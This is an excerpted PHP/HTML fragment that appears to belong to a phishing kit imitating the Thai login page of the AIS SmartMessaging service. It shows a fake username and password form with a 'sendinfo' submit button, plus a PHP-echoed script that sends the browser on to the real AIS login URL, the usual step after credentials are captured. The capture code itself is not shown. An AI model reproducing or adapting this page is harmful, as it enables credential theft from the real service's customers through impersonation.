...
{	
    ...
    echo "<script> window.location.href = 'https://www.smartmessaging.ais.co.th/Login/startLoginTH.do?language=th_TH'; </script>"; 
...
<title>Welcome</title>
<meta charset="utf-8">   <meta http-equiv="X-UA-Compatible" content="IE=edge"/>  <meta http-equiv="origin-trial" content=""/>    <meta name="viewport" content="width=device-width,height=device-height,  initial-scale=1.0, minimum-scale=1, maximum-scale=1, user-scalable=no, shrink-to-fit=no"/>     
...
<style>htm,body{  background-image:url(img/smartsm/background.jpg);   background-repeat:no-repeat;  background-size: auto; background-position:center; max-width:100%; height:auto;  padding:0; border:0; margin:0;  touch-action: manipulation;    user-select: none;   }   ul li {list-style-type:none; text-decoration:none;  }  a{text-decoration:none; }    </style>
...
<div class="container1" >
	...
	<div class="row2">
	    <div class="col1a">  <div class="col1b"> 
		   <div class="login">
		      <div class="titlelogin"> เข้าสู่ระบบ </div>
			  <div class="textuser"> ชื่อผู้ใช้ </div>
		      <div> <input class="iputtxt" type="text"  placeholder=""  name="username"    required="required"   autocomplete="Off" size="40" maxlength="40" oninvalid="this.setCustomValidity('ป้อนชื่อผู้ใช้ที่ถูกต้อง ')"           oninput="setCustomValidity('')"  />  </div>
			  <div class="textpass"> รหัสผ่าน </div>
			  <div> <input class="iputtxt" type="password"  placeholder=""  name="password"    required="required"   autocomplete="Off" size="40" maxlength="40" oninvalid="this.setCustomValidity('ใส่รหัสผ่านที่ถูกต้อง ')"           oninput="setCustomValidity('')"  />  </div>
			  <div class="posiputsubmit"> <input class="iputsubmit" type="submit"  value="เข้าสู่ระบบ"  name="sendinfo"/>  </div>
		   </div>
		   <div class="lang">
